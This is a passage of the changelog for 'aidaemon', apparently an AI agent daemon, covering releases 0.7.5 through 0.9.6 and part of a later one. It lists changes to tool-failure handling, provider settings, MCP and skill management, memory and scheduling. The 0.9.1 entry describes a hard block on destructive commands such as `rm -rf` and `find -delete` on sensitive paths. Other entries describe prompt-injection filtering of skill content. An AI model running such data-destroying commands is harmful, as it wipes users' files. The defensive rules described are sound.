- **Signature-based semantic failure tracking**: Tool failure lockout now tracks error *signatures* (normalized fingerprints) rather than raw failure counts. Different errors from the same tool no longer pile up toward the lockout limit — only repeated identical failure patterns trigger lockout. Error signatures normalize file paths, line numbers, PIDs, and exit codes so the same root cause is detected even when surface details change.
- **Error coaching in tool failure feedback**: First-time tool failures now extract the key error line (via pattern-priority heuristics) and quote it back to the LLM with explicit coaching to try a different approach. Subsequent failures include the specific error context.
- **User-facing error explanations in graceful stop messages**: When the agent stalls or times out, the graceful response now includes an "Issues encountered" section listing actual errors (deduplicated, recent-error priority, resolved ones marked) plus a "Blocked capabilities" section showing which tool categories hit the lockout limit.
- **"Tool Locked Out" stall classification**: `classify_stall()` returns a new category with actionable user guidance when any tool has hit its semantic failure limit.
- **File lookup miss as transient failure**: File-not-found errors from file-oriented tools are classified as transient rather than semantic, so missing-file errors during project exploration do not consume the semantic lockout budget or trigger cooldown periods.
- **Provider `extra_headers` configuration**: All three provider backends (OpenAI-compatible, Anthropic, Google GenAI) support an `extra_headers` map in `config.toml` for injecting custom HTTP headers on every API request, with `"keychain"` resolution for secrets.
- **Anthropic `max_tokens` configuration**: The Anthropic provider accepts an optional `max_tokens` setting (default: 16384, previously hardcoded to 4096).
- **Anthropic dynamic model listing**: `list_models()` now queries the `/models` API endpoint instead of returning a hardcoded list, with fallback to known models if the API call fails.
- **MCP protocol version negotiation**: MCP client initialization tries multiple protocol versions (`2025-06-18`, `2025-03-26`, `2024-11-05`) with automatic fallback — if a version fails, the server is restarted with the next version.
- **MCP rich content block rendering**: MCP tool results now render non-text content blocks (images, resources, structured content) as descriptive placeholders instead of raw JSON. The `isError` flag is respected and converted to an error.
- **MCP automatic server restart on transport failure**: When an MCP tool call fails with a transport-level error (broken pipe, closed stdout, connection reset, timeout), the system automatically restarts the server and retries the call once. Application-level errors are not retried.
- **MCP server enable/disable**: Dynamic MCP servers can be enabled and disabled without deletion. `manage_mcp` tool gains `enable` and `disable` actions; `list` shows enabled/disabled status and source type (static vs. dynamic).
- **Skill enable/disable via filesystem markers**: Skills can be disabled/enabled using `.disabled` marker files. Disabled skills appear in listings with status metadata but are excluded from matching and activation.
- **Skill management approval flow**: `manage_skills` now requires user approval for `add` (from URL), `install` (from registry), and `update` actions.
- **Skill body sanitization on activation**: `UseSkillTool` runs skill body content through `sanitize_external_content()` before returning it to the LLM, filtering prompt injection attempts.
- **Skill resource auto-registration**: `SkillResourcesTool` automatically registers a skill's directory path with the `FileSystemResolver` on first access, so directory-based skills loaded at runtime work without prior manual registration.
- **Raw tool-call token sanitization**: The sanitization pipeline now strips leaked LLM tool-calling protocol tokens (`<|tool_calls_section_begin|>`, `functions.terminal:0 {...}`, etc.) from user-facing output.

### Changed

- **ExecutionPolicy tool budgets increased**: Cheap 6→15, Balanced 12→35, Strong 20→60 — previous values caused hard stops before the force-text escalation system could engage.
- **Empty-response recovery preserves parent context**: When the LLM returns an empty response and the agent retries, the immediate parent user+assistant exchange is now preserved (truncated to 800 chars each), giving the LLM enough conversational context to produce a meaningful reply.
- **Background task lead deduplication**: When executor task results are already sent inline during goal execution, the completion notification sends only a brief signal instead of repeating the full results summary.
- **Telegram session ID stability**: Session IDs are derived from a stable namespace locked for the process lifetime, preventing mid-run session ID drift when the bot username is resolved asynchronously.
- **Telegram typing indicator improvements**: Interval reduced from 4s to 3s; typing action is re-sent immediately after status/thinking messages (Telegram clears typing indicators when a message is sent).
- **Tool name trimming across all providers**: All three providers now trim whitespace from tool names returned by LLMs, preventing spurious "unknown tool" errors from models that occasionally add leading/trailing spaces.
- **Anthropic and Google provider constructors accept `base_url`**: Both providers now accept optional custom `base_url` parameters, enabling use with proxy endpoints and alternative API-compatible services.
- **Skill frontmatter parser rewritten**: Line-based parsing replaces `find("---")` which could split on `---` sequences embedded in description values. Body content can now contain horizontal rules without corruption.
- **Skill cache uses tree fingerprinting**: `SkillCache` computes a recursive filesystem fingerprint instead of relying on top-level directory mtime, correctly detecting changes to nested `SKILL.md` files inside directory-based skills.
- **Skill and MCP listings enriched with status**: `manage_skills list` and `manage_mcp list` now display enabled/disabled counts and per-item status tags.
- **Dependencies trimmed**: Removed `thiserror` and `insta` crate dependencies.

### Fixed

- **Goals table schema mismatch**: `extract_goal()` used `let id: i64` on a `TEXT PRIMARY KEY` column (UUIDs), causing sqlx panics. Fixed to `let id: String`. INSERT was also missing the `id` and `session_id` columns.
- **Stale goal detection type mismatch**: `detect_stale_goals()` also used `let id: i64` for the TEXT id column; fixed to `let id: String`.

## [0.9.6] - 2026-02-20

### Added

- **Inline goal confirmation buttons**: Scheduled goals now show Confirm ✅ / Cancel ❌ buttons (Telegram) instead of reusing the command approval flow. New `ApprovalKind` enum distinguishes goal confirmations from command approvals. `Channel` trait gains `request_goal_confirmation()` with auto-confirm default for channels without button support.
- **Deterministic tool contract violations**: Pre-execution guard blocks `scheduled_goal_runs` calls missing `goal_id` before they reach the tool, with coaching messages redirecting the LLM to the correct tool (`remember_fact` for fact storage, `manage_memories(list_scheduled)` for ID lookup).
- **Result learning for goal_id errors**: Post-execution coaching when `scheduled_goal_runs`, `manage_memories`, `goal_trace`, or `tool_trace` fail with missing `goal_id`, with special detection for fact-storage requests mistakenly routed to goal tools.
- **`ManageMemoriesTool` button-based confirmation**: `create_scheduled_goal` action uses inline approval buttons (via approval channel) when available, with automatic activation on confirm and cleanup (cancel goal + delete schedules) on deny.

### Changed

- **`scheduled_goal_runs` schema requires `goal_id`**: Previously optional, now required in the tool schema to prevent underspecified calls.
- **Tool descriptions clarify scope**: `scheduled_goal_runs` and `remember_fact` descriptions explicitly state their purpose boundaries — `scheduled_goal_runs` is not for fact storage, `remember_fact` is the tool for "learn/remember/save" requests.
- **System prompt tool routing**: Added explicit routing row for "User says learn/remember/save these" → `remember_fact` (not `manage_memories` or `scheduled_goal_runs`). Added fact-storage guidance to memory rules.
- **First-interaction message**: Changed from "I learn from our conversations" to "I adapt my communication style over time based on our conversations" for clarity.

## [0.9.5] - 2026-02-19

### Added

- **Skill promotion quality gates**: Pre-LLM substance check (minimum 2 steps, 8 words) rejects trivial procedures before spending an LLM call. Post-generation `skill_is_valuable()` filter rejects skills with generic triggers (yes/no/ok/hello), insufficient body content, or missing description.
- **`MalformedResponse` provider error kind**: Reason-aware recovery distinguishes parse errors (transient — exponential backoff + cascade fallback) from shape errors (likely deterministic — single retry, fail fast). Per-provider/model/reason breakdown metrics via `LlmPayloadInvalidMetric`.
- **Input token estimation metrics**: Tracks tool schema overhead per LLM call with high-share (>=35%) and high-absolute (>=1500 tokens) threshold counters exposed via policy metrics tool and dashboard.
- **Session-scoped cancel-all**: `cancel_scheduled` with `goal_id="all"` cancels all non-protected scheduled goals scoped to the calling session only.
- **Scheduled goal dedup**: `create_scheduled_goal` detects duplicate schedules by canonicalizing descriptions (stripping execution wrappers, normalizing whitespace) and comparing cron expressions.
- **Internal execution context guard**: Prevents schedule creation from within internal scheduled-task execution (`sub-*` sessions or `internal` channel visibility).
- **Schedule auto-confirm**: `AllowSession`/`AllowAlways` approval responses are remembered per session, auto-confirming subsequent schedule creations without re-prompting.
- **Canonical filename collision detection**: Skill draft approval and filesystem persist check for collisions using `sanitize_skill_filename()` normalization, catching variants like "send-resume" vs "send resume".
- **Explicit approve flag for draft review**: `manage_skills review` now requires `approve: true` or `approve: false` — omitting the flag returns guidance instead of silently skipping.

### Changed

- **Skill promotion LLM prompt**: Updated to instruct the model to skip trivially simple/generic procedures and conversational filler behaviors.
- **`skill_draft_exists_for_procedure`**: Now checks all draft statuses (pending, approved, dismissed) to prevent re-promotion of previously dismissed procedures.
- **Scheduled goal descriptions**: `build_scheduled_goal_description()` normalizes composed goal text by extracting original request and follow-up parts, preventing description corruption from multi-turn wrapping.
- **System prompt scheduling guidance**: Replaced proactive scheduling suggestions with explicit-request-only guidance — only create exactly what was requested.
- **`ProviderKind` made `Copy`**: Simple enum no longer requires `.clone()` calls throughout the codebase.
- **Provider response body errors**: `resp.text().await` failures in all three providers (OpenAI, Anthropic, Google) now classified as `Network` errors instead of propagating as unclassified `anyhow` errors.
- **OpenAI `choices[0]` and `message` extraction**: Now returns `MalformedResponse(Shape)` instead of generic `anyhow` errors, enabling structured recovery.

## [0.9.4] - 2026-02-18

### Added

- **Semantic fact dedup**: `upsert_fact()` detects synonym keys (e.g., `editor` vs `preferred_editor`) via embedding similarity (0.85 threshold) with token-overlap guards to prevent false merges.
- **Mid-session episode creation**: Long-running sessions (20+ events since last episode) get episodes captured before context rotates out, preventing permanent context loss.
- **Multiple episodes per session**: Removed unique constraint on `session_id` in episodes table to support incremental episode capture.
- **Batch fact storage**: `remember_fact` tool accepts a `facts` array for storing multiple facts in one call.
- **Fuzzy forget matching**: Forget action uses canonical, case-insensitive, and substring matching with cross-category fallback.
- **Reply sanitization pipeline**: Strips model identity leaks, internal tool name references, and diagnostic/system blocks from user-facing replies.
- **Default + fallback model routing**: New `default_model` + `fallback_models` config replaces the old fast/primary/smart tier system (legacy keys still work).
- **Deterministic pre-routing**: Schedule/cancel/goal fast-paths handled before first LLM call, removing the consultant classification pass.
- **Cloudflare AI Gateway support**: Optional `gateway_token` for OpenAI-compatible providers with automatic gateway detection.
- **Moonshot and MiniMax provider presets**: New OpenAI-compatible provider presets.
- **Comprehensive memory tests**: New test suite covering fact dedup, episode lifecycle, and memory retrieval edge cases.
- **Scheduler flaw tests**: New integration tests for scheduler edge cases.

### Changed

- **Episode retrieval threshold**: Lowered from 0.5 to 0.3, matching the fact retrieval threshold for better recall.
- **Agent proactivity default**: `asks_before_acting` defaults to `false` for new user profiles — agent only confirms destructive actions.
- **Telegram message splitting**: Long replies split at 4096-char boundary instead of truncating.
- **Tools available from iteration 1**: All LLM calls have tools available, removing the tool-free consultant pass.

### Fixed

- **Stale fact duplicates (BUG-8)**: Semantically identical facts with different keys no longer accumulate as duplicates.
- **Episode recall on context rotation (BUG-9)**: Long sessions no longer lose conversational context when the 20-message window rotates.
- **Path normalization**: `validate_path()` now normalizes `.` components correctly.
- **Provider JSON error messages**: Anthropic and Google providers wrap parse errors with proper `ProviderError` context.

## [0.9.3] - 2026-02-17

### Added

- **Transient failure classification**: Tool failure detection distinguishes transient errors (rate limits, timeouts, network) from semantic errors, triggering cooldowns instead of outright blocking.
- **Tool result head+tail compression**: Large tool results preserve both beginning and end of output while dropping the middle, improving visibility into critical information.
- **Query-aware fact selection**: System prompt uses intelligent fact scoring with freshness boosting to surface more relevant facts during owner DM conversations.
- **Tool loop prompt optimization**: Compact `ToolLoopPromptStyle` on subsequent iterations reduces prompt size while maintaining model context.
- **Internal control marker stripping**: Sanitization removes agent-internal markers (`[SYSTEM]`, `[DIAGNOSTIC]`, etc.) from final replies to prevent leaking control flow to users.
- **Adaptive tool limits for goals**: Tool call limits increase from 30 to 55 when actively working on a goal for more exploration budget.

### Changed

- **Stall detection**: Thresholds dynamically adjust based on failure patterns — transient failures and empty responses get +2 iterations before stalling.
- **Result learning refactored**: Error handling pipeline restructured to use `classify_tool_result_failure()` with structured pattern matching (HTTP status codes, JSON error fields, exit codes).
- **Policy signal word-boundary matching**: Risk estimation uses word-boundary matching instead of substring matching for action keywords, reducing false positives.
- **Tool failure tracking**: Semantic and transient failures tracked separately with distinct counters and blocking behavior.
- **Error solution injection**: Diagnostic hints from error memory moved to first-failure only, reducing noise.
- **README simplified**: Reduced from 633 to 99 lines; detailed docs moved to external documentation site.

### Fixed

- **Tool failure categorization**: Comprehensive pattern detection for HTTP statuses, JSON error payloads, exit codes, and transient error strings.
- **Final reply sanitization**: Internal control markers never leak into user-facing responses.
- **Cascade fallback**: Returns response for current call only without persistent model downgrade.

## [0.9.2] - 2026-02-16

### Added

- **Provider ChatOptions**: New `ChatOptions` struct with `ResponseMode` (Text/JsonObject/JsonSchema) and `ToolChoiceMode` (Auto/None/Required/Specific) for per-call LLM behavior control.
- **Intent gate JSON schema enforcement**: Consultant phase requests structured intent analysis via `ResponseMode::JsonSchema` with strict validation and `ToolChoiceMode::None`.
- **Deferred no-tool recovery**: When model defers work without attempting tools, subsequent calls force `tool_choice=required` to break the deferral loop.
- **Terminal background process completion cache**: Background processes retain final output in 128-entry LRU cache (10-min TTL), allowing result retrieval after automatic cleanup.
- **Terminal hub integration**: Terminal tool holds weak reference to ChannelHub for direct delivery of background process progress/completion events.
- **Spawn tool fallback notifications**: SpawnAgentTool gains queued notification path when hub delivery fails for background sub-agent completion.
- **Goal daily token budget extension approval**: When goal budget is exhausted mid-execution, owner is prompted to approve extension (up to hard cap) instead of immediate termination.
- **Goal task result excerpts**: Summarizes up to 3 recent completed task results for goal completion notifications instead of only the final task.
- **Latest tool output excerpt fallback**: Agent extracts latest non-system tool output for completion replies when LLM produces empty response after successful tool execution.
- **Path aliases configuration**: New optional `[path_aliases]` config section for user-friendly path shortcuts (e.g., `projects = ["~/projects"]`).
- **Local execution deterministic intent override**: Intent gate forces `needs_tools=true` for explicit local execution keywords and local version queries.

### Changed

- **Consultant completion recovery**: When reply is empty after tool execution, agent recovers with latest tool output excerpt instead of generic "Done" message.
- **Needs-tools enforcement**: When consultant marks turn as needing tools and model returns text-only, text is suppressed and model retries with forced tool calls.
- **Deterministic background acknowledgment**: Background detach messages are deterministically enforced rather than relying on model compliance.
- **Spawn tool background mode**: Now requires at least one of hub OR state store (notification queue) instead of hub exclusively.

### Fixed

- **Format string compilation error**: Fixed unescaped path alias example in system prompt format macro.
- **Clippy warnings**: Fixed derivable Default impls, collapsible if, `is_multiple_of()` usage.

## [0.9.1] - 2026-02-16

### Added

- **Turn context resolution**: Followup mode classification (new/followup/clarification) with scope carryover detection and multi-project scope awareness.
- **Graceful partial-stall responses**: When the agent stalls after meaningful progress (3+ successful tool calls), it now acknowledges progress before stopping instead of a generic stall message.
- **Project directory scope constraints**: Tool calls are validated against the resolved project scope to prevent cross-project file operations.
- **Hard-block destructive commands**: `find -delete` and `rm -rf` on broad/sensitive paths are now blocked before the approval flow, even in yolo mode.
- **Context integrity metrics**: New policy counters for context bleed prevention, mismatch preflight drops, followup mode overrides, and cross-scope blocking.
- **Stall classification tests**: Tests for tool policy block, edit target drift, generic value filtering, and provider server error detection.
- **npm command rejection guidance**: `run_command` now shows allowed npm prefixes and suggests `terminal` for installs.

### Changed

- **Stopping phase**: Meaningful progress detection (total_successful_tool_calls >= 3 or evidence_gain_count >= 2) triggers graceful exit instead of hard stall.
- **Project directory hints**: Seeded from turn context's primary project scope rather than just user text extraction.
- **System prompt guidance**: Prefer `search_files`/`project_inspect` over raw terminal for discovery; added recursive grep guidance.

### Fixed

- **Compilation error**: Fixed `borrow of moved value` in tool_defs.rs capabilities entry.
- **Format string error**: Fixed unescaped parentheses in system prompt format macro.

## [0.9.0] - 2026-02-16

### Added

- **Consultant system**: Fast-path decision making for intent classification via separate classifier + executor LLM calls. Includes intent gate parsing, policy signal detection, and orchestration phases.
- **Agent module decomposition**: Refactored monolithic `agent.rs` (~3,300 lines) into 65 files across 9 subdirectories (`loop/`, `consultant/`, `intent/`, `policy/`, `runtime/`, `tools/`), with explicit phase-based control flow (bootstrap, message build, LLM, tool execution, stopping).
- **SharedLlmRuntime**: Centralized LLM provider + router abstraction (`Arc<RwLock>`) enabling runtime provider reloads without recreating dependent components.
- **Library crate**: Moved module declarations to `src/lib.rs` for programmatic usage of aidaemon as a library.
- **Policy metrics and autotuning**: Lock-free `AtomicU64` counters for policy decisions with dynamic uncertainty threshold adjustment based on failure ratios.
- **Recall guardrails**: Personal memory privacy rules with tool filtering — blocks browser/external tool escalation during personal recall turns.
- **Route health diagnostics**: Intent gate route health monitoring in the diagnose tool — detects empty direct replies, sustained clarification rate spikes, and routing anomalies.
- **Critical fact signal detection**: Memory summarization now detects identity/relationship statements ("my name is", "wife", "daughter") and preserves them through context window compression.
- **Batch project inspection**: `project_inspect` tool accepts `paths` array (max 12) for multi-directory inspection in a single call.
- **Lightweight interjection filtering**: Grace-period-aware spam filter for rapid-fire greetings within 120 seconds of daemon restart.
- **Duplicate message suppression**: Per-session deduplication cache (10-second window) in ChannelHub for identical heartbeat/status messages.
- **Goal cancellation support**: Unified `/cancel`, `/stop`, `/abort` commands across Slack, Telegram, and Discord for both tasks and active goals.
- **Post-install migration**: `install.sh` now runs `aidaemon migrate` automatically after installation to handle database schema upgrades.
- **CLI smoke tests**: `assert_cmd`-based tests for `--help` and `--version` flags.
- **CHANGELOG.md**: Added changelog for release tracking.

### Changed

- **Legacy messages to events migration**: Canonical event stream is now the single source of truth. Messages table is migrated to events and dropped. Migration is idempotent with completion tracking via settings key.
- **CLI agent concurrency**: Replaced `HashSet` locks with `WorkingDirClaim` structs and Jaccard similarity checking (>50% blocks duplicate prompts). Added `Semaphore` for true concurrent limit enforcement.
- **Router simplification**: Removed `classify_query()` and `ClassificationResult` — router now only provides model selection; classification logic moved to agent layer.
- **Memory manager initialization**: Takes `SharedLlmRuntime` instead of separate provider + fast_model. Removed 30-second event-to-messages projection loop.
- **Retention policy**: Migrated from legacy messages table to canonical events table for cleanup.
- **CI formatting gate**: `cargo fmt --check` is now a hard gate (removed `continue-on-error`).
- **Deprecated policy config**: Removed `classify_retirement_enabled`, `classify_retirement_window_days`, `classify_retirement_max_divergence` from config.

### Fixed

- **UTF-8 panic**: Fixed multi-byte character boundary panic in `compress_tool_result()` — now uses char boundaries instead of raw byte slicing.
- **RwLock poison handling**: Improved recovery with `.unwrap_or_else(|poisoned| poisoned.into_inner())` across channel implementations.
- **Integration test stability**: Fixed `test_personal_recall_challenge_inherits_previous_turn_context` to use the new consultant classifier + executor flow.

### Security

- **Test data sanitization**: Removed all personal information (names, file paths, project references) from test files. Replaced with generic test fixtures.

## [0.8.0] - 2025-12-15

### Added

- Goal system unification with personal goals and multi-schedule support
- Browser tool enhancements

## [0.7.7] - 2025-12-01

### Added

- Inline tool failure diagnostics
- In-session error learning
- Error solution deduplication

## [0.7.6] - 2025-11-15

### Fixed

- Rust 1.93 clippy lints
- Event store enhancements
- Post-task improvements
- Telegram fixes

## [0.7.5] - 2025-11-01

### Fixed

- CLI agent heartbeat fix
- Empty response recovery
- Module decomposition
- Token budgets
